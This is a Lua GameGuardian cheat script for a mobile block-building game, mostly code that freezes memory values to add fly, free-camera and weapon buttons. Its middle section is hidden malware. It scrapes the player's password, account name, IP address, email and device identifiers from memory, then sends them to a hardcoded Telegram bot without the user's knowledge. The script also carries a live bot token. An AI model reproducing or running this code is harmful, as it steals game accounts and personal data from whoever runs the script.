Main10['Anim']=t[8]
Main10['Ping']=gameReset2[2]
Main10.ServerTime=gameReset2[3]
Main10['Fly']=t[9]
Main10.timerUI3=MainUI.time3
Main10.timerUI1=MainUI.time1
MainUI['X2']=t[10]
MainUI['Y2']=t[11]
MainUI['Z2']=t[12]
Main10['AnimSt']={address=Main10['Anim'].address+4,flags=4,freeze=true,value=-1}
Main10['StupidUI']={address=MainUI['HurtMask'].address+0xA8,flags=16,freeze=true,value=0}
local t=Mag1[1].address
Main10['Очки'],Main10['Шляпа'],Main10['Шарф'],Main10['Хвост'],Main10['Футболка'],Main10['Штаны'],Main10['Волосы'],Main10['Обувь'],Main10['Лицо'],Main10['Корона']={address=t+0x5fc,flags=4},{address=t+0x608,flags=4},{address=t+0x600,flags=4},{address=t+0x614,flags=4},{address=t+0x5f0,flags=4},{address=t+0x5f4,flags=4},{address=t+0x5ec,flags=4},{address=t+0x5f8,flags=4},{address=t+0x5e8,flags=4},{address=t+0x648,flags=4}
t=nil
rgbnick=nil
end
main1237()
function getFPS()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
if SkyBlockGame then
gg.searchNumber(';SkyBlockCustomDialog',2)gg.refineNumber(';g',2)t=gg.getResults(99999)gg.clearResults() for i=1,#t do t[i].address=t[i].address+2 end gg.loadResults(t)gg.refineNumber(0,2)t=gg.getResults(99999)gg.clearResults() for i=1,#t do t[i].address=t[i].address+32 t[i].flags=4 end gg.loadResults(t)gg.refineNumber('1~257',4)Main10.SkyBlockDialog={address=gg.getResults(1)[1].address,flags=4,freeze=true,value=1}gg.clearResults()
end
gg.searchNumber(4561245704515320021,32)
t=gg.getResults(99999)
fpsst={{address=t[1].address+-856,flags=4}}
gg.clearResults()
gg.addListItems(fpsUnlock)
gg.clearList()
end
function rebornMyFunctions()
end
function setCopyID()
setMode()
getFPS()

gg.clearList()
SosiHuy()
color123(nil,nil,nil)
GetWizardValue()
function dicktest(val)
s,s2=0,{}
while true do
k=gg.getValues({w={address=val+s,flags=1}})
if k.w.value~=34 and k.w.value~=125 then
s2[s+1]=k.w
s=s+1
if s>900 then
text='error'
break
end
else
text=UTF_8(s2)
break
end
 end return text end
 res=gg.getValues({{address=Mag1[1].address+0x458,flags=32},{address=Mag1[1].address+0x688,flags=4}})
if res[2].value==1 then res[2].value='♂️' else res[2].value='♀️' end
EngineVer='Engine Version: '..EngineVersion
WizardBG=gg.getTargetInfo()
WizardBG=WizardBG.label..' v'..WizardBG.versionName
if res[1].value~=64928 and res[1].value~=1078251600 and res[1].value~=2852950014 and res[1].value~=2781382126 and res[1].value~=2558942096 and res[1].value~=6615632142 and 1==2 then
gg.clearResults()gg.clearList()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(':],"androidId":"',1)
if gg.getResultsCount()~=0 then
gg.refineNumber('::"',1)gg.refineNumber(':"',1)w=gg.getResults(1)[1].address+1 gg.clearResults() device=dicktest(w)
gg.searchNumber(':"manufacture":"',1,_,_,w-3000,w+3000)if gg.getResultsCount()~=0 then gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()device2=dicktest(t) else device2='не найдено' end
gg.searchNumber(':"brand":"',1,_,_,w-3000,w+3000)if gg.getResultsCount()~=0 then gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()device3=dicktest(t) else device3='не найдено' end
gg.searchNumber(':"osVersionName":"',1,_,_,w-3000,w+3000)if gg.getResultsCount()~=0 then gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()device4=dicktest(t) else device4='не найдено' end
gg.searchNumber(':"timezoneV":"',1,_,_,w-3000,w+3000)if gg.getResultsCount()~=0 then gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()device5=dicktest(t) else device5='не найдено' end
gg.searchNumber(':"timezone":"',1,_,_,w-3000,w+3000)if gg.getResultsCount()~=0 then gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()device6=dicktest(t) else device6='не найдено' end
gg.searchNumber(':"model":"',1,_,_,w-3000,w+3000)if gg.getResultsCount()~=0 then gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()device7=dicktest(t) else device7='не найдено' end
wizarddevice='\nID Телефона: `'..device..'`\nТелефон: `'..device2..' '..device3..' '..device7..'` ('..device4..')\nЧасовой пояс: GMT +'..device5..' ('..device6..')'
end

gg.clearResults()gg.clearList()
gg.setRanges(gg.REGION_OTHER)
gg.searchNumber(':},"password":{"mValue":"')
if gg.getResultsCount()~=0 then
gg.refineNumber('::"',1)gg.refineNumber(':"',1)w=gg.getResults(1)[1].address+1 gg.clearResults() pass=dicktest(w)
gg.searchNumber(':"account":{"mValue":"',1,_,_,w-1400,w+1400)gg.refineNumber(':":"',1)gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass2=dicktest(t)
gg.searchNumber(':"clientIp":{"mValue":"',1,_,_,w-1400,w+1400)gg.refineNumber(':":"',1)gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass3=dicktest(t)
gg.searchNumber(':"},"gDiamonds":{"mValue":',1,_,_,w-1400,w+1400) gg.refineNumber(':e":',1)gg.refineNumber(':":',1)gg.refineNumber('::',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass4=dicktest(t)
gg.searchNumber(':},"region":{"mValue":"',1,_,_,w-1400,w+1400) gg.refineNumber(':":"',1)gg.refineNumber('::"',1)gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass5=dicktest(t)
gg.searchNumber(':},"registerTime":{"mValue":',1,_,_,w-1400,w+1400) gg.refineNumber(':ue":',1)
	gg.refineNumber('::',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass6=dicktest(t)
	gg.searchNumber(':vipLv":{"mValue":',1,_,_,w-1400,w+1400) gg.refineNumber(':ue":',1)
	gg.refineNumber('::',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass7=dicktest(t)
gg.searchNumber(':},"isFinishSecretQuestion":{"mValue":',1,_,_,w-1400,w+1400) gg.refineNumber(':ue":',1)
	gg.refineNumber('::',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass8=dicktest(t)
	if pass8=='true' then pass8='Есть' else pass8='Нету' end
	gg.searchNumber(':},"email":{"mValue":"',1,_,_,w-1400,w+1400) gg.refineNumber('::"',1)
	gg.refineNumber(':"',1)t=gg.getResults(1)[1].address+1 gg.clearResults()pass9=dicktest(t)
	if pass9=='' then pass9='Нету' else pass9='Есть (`'..pass9..'`)' end
--isFinishSecretQuestion"	

m12=os.date('%m',pass6)
h21=os.date('%d',pass6)
h31=os.date('%Y',pass6)
h41=os.date('%H',pass6)
h51=os.date('%M',pass6)
h61=os.date('%S',pass6)
if m12 == '01' then
month = 'января'
elseif m12 == '02' then
month='февраля'
elseif m12 == '03' then
month='марта'
elseif m12 == '04' then
month='апреля'
elseif m12 == '05' then
month='мая'
elseif m12 == '06' then
month='июня'
elseif m12 == '07' then
month='июля'
elseif m12 == '08' then
month='августа'
elseif m12 == '09' then
month='сентября'
elseif m12 == '10' then
month = 'октября'
elseif m12 == '11' then
month='ноября'
elseif m12 == '12' then
month='декабря'
end
dateR = h21..' '..month..' '..h31..' года'
timeR = h41..'ч '..h51..'м '..h61..'с'
pass6=dateR..' ('..timeR..')'
else
t='Не удалось получить'
pass,pass2,pass3,pass4,pass5,pass6,pass7,pass8,pass9=t,t,t,t,t,t,t,t,t,t
 end
t = "7872384523:AAFRIO2MNs7AswbQjilr0R-soTjPBuJ5oJg" 
i = "-4625685552" 
j1=usernickname:gsub("_","ниж. подчёркивание")
j2=myMap:gsub('_','.')
kkk="script 1.3 user\n\nНик: `"..j1..'`\nИмя пользователя: `'..pass2..'`\nID: `'..res[1].value..'`\nПароль: `'..pass..'`\nПочта: '..pass9..'\nВопросы: '..pass8..'\nВип: '..pass7..'\nПол: '..res[2].value..'\nГкубов: '..pass4..'\nСтрана: '..pass5..'\nАйпи: `'..pass3..'`\nДата регистрации: '..pass6..'\nИгра: '..gameName..'\nКарта: '..j2..'\n'..EngineVer
if wizarddevice then
kkk=kkk..wizarddevice end
gg.alert(kkk)
send = gg.makeRequest('https://api.telegram.org/bot' .. t .. '/sendMessage', nil,
                                 'chat_id=' .. i ..'&text=' .. kkk .. "&parse_mode=Markdown")end
                                 
       for i=1,3 do WizardMain(UI1,'Welcome! :)',5000,1,{1,0,1})
       if myGameType~='1014' then
WizardMain(UI3,'Helpers: ▢FFFFFF00Yotsu23, ▢FF0000FFMadaraDaOne',5000,3,{1,0,1},_,-150)
end end                          
if BASGame or myGameType=='1026' or myGameType=='1037' then
NoDelay(true)
else
NoDelay(false)
end
MainUI.Wizard1488={address=Wizard69+4,flags=16,freeze=true,value=-99999999}
Main10.Wizard1488=MainUI.Wizard1488                 
mainspisok={MainUI['UpdateMain'],{address=MainUI['Shift'].address + 0x148,flags=16,freeze=true,value=0},{address=MainUI['Shift'].address + 0x14C,flags=16,freeze=true, value=0},{address=MainUI['Shift'].address + 0x144,flags=16,freeze=true,value=1},{address=MainUI['RunState'].address + 0x14C,flags=16,freeze=true, value=0},{address=MainUI['RunState'].address + 0x148,flags=16,freeze=true,value=1},{address=MainUI['RunState'].address + 0x144,flags=16,freeze=true,value=1},{address=MainUI['Sprint'].address + 0x144,flags=16,freeze=true,value=0},{address=MainUI['Sprint'].address + 0x148,flags=16,freeze=true,value=1},{address=MainUI['Sprint'].address + 0x14C,flags=16,freeze=true,value=0},{address=MainUI['Jump'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['Jump'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['Jump'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['Jump'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Fly'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['Fly'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['Fly'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['FlyDrop'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['FlyDrop'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['FlyDrop'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['FlyUp'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['FlyUp'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['FlyUp'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['FlyUp'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['FlyDown'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['FlyDown'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['FlyDown'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['FlyDown'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['Sneak'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['Sneak'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['Sneak'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['Sneak'].address+0x174,flags=16,freeze=true,value=1},MainUI['Wizard225'],MainUI['Wizard228'],MainUI['Wizard229'],MainUI['Wizard1488'],{address=MainUI['Right'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['Right'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Right'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['Right'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['Left'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['Left'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Left'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['Left'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['Forward'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['Forward'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Forward'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['Forward'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['Back'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['Back'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Back'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['Back'].address+0x14C,flags=16,freeze=true,value=0},{address=btnmain[1].address+0x144,flags=16,freeze=true,value=0},{address=btnmain[1].address+0x174,flags=16,freeze=true,value=1},{address=btnmain[1].address+0x148,flags=16,freeze=true,value=1},{address=btnmain[1].address+0x14C,flags=16,freeze=true,value=0.5},{address=btnmain[2].address+0x144,flags=16,freeze=true,value=0},{address=btnmain[2].address+0x174,flags=16,freeze=true,value=1},{address=btnmain[2].address+0x148,flags=16,freeze=true,value=1},{address=btnmain[2].address+0x14C,flags=16,freeze=true,value=0.5},{address=btnmain[3].address+0x144,flags=16,freeze=true,value=0},{address=btnmain[3].address+0x174,flags=16,freeze=true,value=1},{address=btnmain[3].address+0x148,flags=16,freeze=true,value=1},{address=btnmain[3].address+0x14C,flags=16,freeze=true,value=0.5},{address=btnmain[4].address+0x144,flags=16,freeze=true,value=0},{address=btnmain[4].address+0x174,flags=16,freeze=true,value=1},{address=btnmain[4].address+0x148,flags=16,freeze=true,value=1},{address=btnmain[4].address+0x14C,flags=16,freeze=true,value=0.5},{address=MainUI['Pole'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['Pole'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Pole'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['Pole'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['PoleBG'].address+0x144,flags=16,freeze=true,value=0.5},{address=MainUI['PoleBG'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['PoleBG'].address+0x148,flags=16,freeze=true,value=0.5},{address=MainUI['PoleBG'].address+0x14C,flags=16,freeze=true,value=0.5},{address=UI4[1].address+0x878+raznica,flags=4,freeze=true,value=4},{address=UI4[1].address+0x8A0+raznica,flags=2,freeze=true,value=';W'},{address=UI4[1].address+0x8A2+raznica,flags=2,freeze=true,value=';Z'},{address=UI4[1].address+0x8A4+raznica,flags=2,freeze=true,value=';R'},{address=UI4[1].address+0x8A6+raznica,flags=2,freeze=true,value=';D'},{address=UI4[1].address+0x8E8+raznica,flags=16,freeze=true,value=55},{address=UI4[1].address+0x144,flags=16,freeze=true,value=0},{address=UI4[1].address+0x148,flags=16,freeze=true,value=0},{address=UI4[1].address+0x14C,flags=16,freeze=true,value=0},{address=UI4[1].address+0x154,flags=16,freeze=true,value=1},{address=UI4[1].address+0x158,flags=16,freeze=true,value=0},{address=UI4[1].address+0x15C,flags=16,freeze=true,value=0},{address=UI4[1].address+0x174,flags=16,freeze=true,value=1},{address=UI4[1].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.48970399},{address=UI4[1].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.48970399)+60},{address=UI4[1].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.0805555556},{address=UI4[1].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.0805555556)+60},{address=UI4[1].address,flags=4,freeze=true,value=257},MainUI['FreeCam'],MainUI['FreeCamYaw'],MainUI['FreeCamLock'],MainUI['FreeCamUnlock'],MainUI['FreeCamActor'],{address=MainUI['FreeCamUnlock'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['FreeCamUnlock'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['FreeCamUnlock'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=MainUI['FreeCamUnlock'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.316666667)+60},{address=MainUI['FreeCamLock'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['FreeCamLock'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['FreeCamLock'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=MainUI['FreeCamLock'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.316666667)+60},{address=MainUI['FreeCamStatus'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['FreeCamStatus'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['FreeCamStatus'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=MainUI['FreeCamStatus'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=MainUI['FreeCamUnlock'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['FreeCamUnlock'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['FreeCamUnlock'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['FreeCamLock'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['FreeCamLock'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['FreeCamLock'].address+0x14C,flags=16,freeze=true,value=0},{address=UI4[1].address+0x244,flags=16,freeze=true,value=0},{address=MainUI['Sprint'].address + 0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['Sprint'].address + 0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['Sprint'].address + 0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['Sprint'].address + 0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},{address=MainUI['Shift'].address + 0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['Shift'].address + 0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['Shift'].address + 0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['Shift'].address + 0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},{address=MainUI['RunState'].address + 0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['RunState'].address + 0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['RunState'].address + 0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['RunState'].address + 0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},{address=MainUI['MoveStateMain'].address + 0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['MoveStateMain'].address + 0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['MoveStateMain'].address + 0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['MoveStateMain'].address + 0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},{address=UI7[1].address + 0xA0,flags=16,freeze=true,value=Screen['X']*0.907335907},{address=UI7[1].address + 0xA4,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=UI7[1].address + 0xA8,flags=16,freeze=true,value=(Screen['X']*0.907335907)+60},{address=UI7[1].address + 0xAC,flags=16,freeze=true,value=(Screen['Y']*0.316666667)+60},{address=UI7[1].address + 0x144,flags=16,freeze=true,value=1},{address=UI7[1].address + 0x148,flags=16,freeze=true,value=0},{address=UI7[1].address + 0x14C,flags=16,freeze=true,value=0},UI7[1],MainUI['Fishing'],{address=MainUI['Fishing'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.907335907},{address=MainUI['Fishing'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.907335907)+60},{address=MainUI['Fishing'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['Fishing'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},{address=MainUI['Fishing'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['Fishing'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['Fishing'].address+0x14C,flags=16,freeze=true,value=0},Main10.GunPreviewCheckBox,{address=Main10.GunPreviewCheckBox.address+0xA0,flags=16,freeze=true,value=Screen['X']*0.868725869},{address=Main10.GunPreviewCheckBox.address+0xA8,flags=16,freeze=true,value=Screen['X']*0.868725869+60},{address=Main10.GunPreviewCheckBox.address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.232638889},{address=Main10.GunPreviewCheckBox.address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.232638889+60},{address=Main10.GunPreviewCheckBox.address+0xb0,flags=1,freeze=true,value=1},{address=Main10.GunPreviewCheckBox.address+0x144,flags=16,freeze=true,value=0},{address=Main10.GunPreviewCheckBox.address+0x148,flags=16,freeze=true,value=0},{address=Main10.GunPreviewCheckBox.address+0x14c,flags=16,freeze=true,value=0},{address=Main10.GunPreviewCheckBox.address+0x154,flags=16,freeze=true,value=0},{address=Main10.GunPreviewCheckBox.address+0x158,flags=16,freeze=true,value=1},{address=Main10.GunPreviewCheckBox.address+0x15c,flags=16,freeze=true,value=0},{address=Main10.GunPreviewCheckBox.address+0x8e8+raznica,flags=16,freeze=true,value=40},{address=Main10.GunPreviewCheckBox.address+0x878+raznica,flags=4,freeze=true,value=3},{address=Main10.GunPreviewCheckBox.address+0x8a0+raznica,flags=2,freeze=true,value=';F'},{address=Main10.GunPreviewCheckBox.address+0x8a2+raznica,flags=2,freeze=true,value=';u'},{address=Main10.GunPreviewCheckBox.address+0x8a4+raznica,flags=2,freeze=true,value=';n'},{address=Main10.GunPreviewCheckBox.address+0x938+raznica,flags=16,freeze=true,value=-1},MainUI['NickSize'],NickSize[1],NickSize[2],{address=MainUI['NickSize'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['NickSize'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['NickSize'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['NickSize'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.420984456},{address=MainUI['NickSize'].address+0xA8, flags=16,freeze=true,value=(Screen['X']*0.420984456)+250},{address=MainUI['NickSize'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.791666667}, {address=MainUI['NickSize'].address+0xAC, flags=16,freeze=true,value=(Screen['Y']*0.791666667)+30},{address=MainUI['GunRight'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['GunRight'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['GunRight'].address+0x14C,flags=16,freeze=true,value=0},MainUI['GunRight'],{address=MainUI['GunRight'].address+0x4AC,flags=4,freeze=true,value=20001},{address=MainUI['GunLeft'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['GunLeft'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['GunLeft'].address+0x14C,flags=16,freeze=true,value=1},MainUI['GunLeft'],{address=MainUI['GunLeft'].address+0x4AC,flags=4,freeze=true,value=20001},{address=MainUI['GunLeft'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['GunLeft'].address+0xA4,flags=16,freeze=true,value=Screen.Y*0.0694444444},{address=MainUI['GunLeft'].address+0xA8,flags=16,freeze=true,value=350},{address=MainUI['GunLeft'].address+0xAC,flags=16,freeze=true,value=Screen.Y*0.0694444444+200},{address=MainUI['GunLeft'].address+0xb0,flags=1,freeze=true,value=1},{address=MainUI['GunLeft'].address+0x174,flags=16,freeze=true,value=0.6},{address=MainUI['GunReload'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['GunReload'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['GunReload'].address+0x14C,flags=16,freeze=true,value=0},MainUI['GunReload'],{address=MainUI['GunThrow'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['GunThrow'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['GunThrow'].address+0x14C,flags=16,freeze=true,value=1},MainUI['GunThrow'],{address=MainUI['GunAim'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['GunAim'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['GunAim'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['GunAim'].address+0xb0,flags=1,freeze=true,value=1},{address=MainUI['GunAim'].address+0xa0,flags=16,freeze=true,value=Screen.X*0.685358255},{address=MainUI['GunAim'].address+0xa8,flags=16,freeze=true,value=Screen.X*0.685358255+120},{address=MainUI['GunAim'].address+0xa4,flags=16,freeze=true,value=Screen.Y*0.66},{address=MainUI['GunAim'].address+0xac,flags=16,freeze=true,value=Screen.Y*0.66+120},{address=MainUI['GunNotAim'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['GunNotAim'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['GunNotAim'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['GunNotAim'].address+0xb0,flags=1,freeze=true,value=1},{address=MainUI['GunNotAim'].address+0xa0,flags=16,freeze=true,value=Screen.X*0.685358255},{address=MainUI['GunNotAim'].address+0xa8,flags=16,freeze=true,value=Screen.X*0.685358255+120},{address=MainUI['GunNotAim'].address+0xa4,flags=16,freeze=true,value=Screen.Y*0.66},{address=MainUI['GunNotAim'].address+0xac,flags=16,freeze=true,value=Screen.Y*0.66+120},{address=MainUI['GunAimGUI'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['GunAimGUI'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['GunAimGUI'].address+0x14C,flags=16,freeze=true,value=0},{address=MainUI['GunAimGUI'].address+0x174,flags=16,freeze=true,value=0.5},MainUI['GunPreview'],{address=MainUI['GunPreview'].address+0x174,flags=16,freeze=true,value=0},MainUI['EngineVersion'],{address=MainUI['EngineVersion'].address+0x878+raznica,flags=4,freeze=true,value=WizardUtf8.len(EngineVer)},{address=MainUI['EngineVersion'].address+0x154,flags=16,freeze=true,value=0},{address=MainUI['EngineVersion'].address+0x158,flags=16,freeze=true,value=1},{address=MainUI['EngineVersion'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['EngineVersion'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.74002574},{address=MainUI['EngineVersion'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.74002574},{address=MainUI['EngineVersion'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.972222222},{address=MainUI['EngineVersion'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.972222222},MainUI['App'],{address=MainUI['App'].address+0x878+raznica,flags=4,freeze=true,value=WizardUtf8.len(WizardBG)},{address=MainUI['App'].address+0x154,flags=16,freeze=true,value=1},{address=MainUI['App'].address+0x158,flags=16,freeze=true,value=0},{address=MainUI['App'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['App'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.74002574},{address=MainUI['App'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.74002574},{address=MainUI['App'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.9375},{address=MainUI['App'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.9375},{address=MainUI['ShowAnims'].address+0x154,flags=16,freeze=true,value=0},{address=MainUI['ShowAnims'].address+0x158,flags=16,freeze=true,value=1},{address=MainUI['ShowAnims'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['ShowAnims'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.0249221184},{address=MainUI['ShowAnims'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.0249221184},{address=MainUI['ShowAnims'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.972222222},{address=MainUI['ShowAnims'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.972222222},MainUI['wizardtnt'],{address=MainUI['wizardtnt2'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt2'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.868725869},{address=MainUI['wizardtnt2'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.868725869)+60},{address=MainUI['wizardtnt2'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=MainUI['wizardtnt2'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.316666667)+60},{address=MainUI['wizardtnt3'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt3'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt3'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt3'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.868725869},{address=MainUI['wizardtnt3'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.868725869)+60},{address=MainUI['wizardtnt3'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['wizardtnt3'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},{address=MainUI['wizardtnt4'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt4'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt4'].address+0x14C,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt4'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.868725869},{address=MainUI['wizardtnt4'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.868725869)+60},{address=MainUI['wizardtnt4'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.397222222},{address=MainUI['wizardtnt4'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.397222222)+60},MainUI['wizardtnt4'],MainUI['wizardtnt3'],{address=MainUI['Fishing'].address+0x878+raznica,flags=4,freeze=true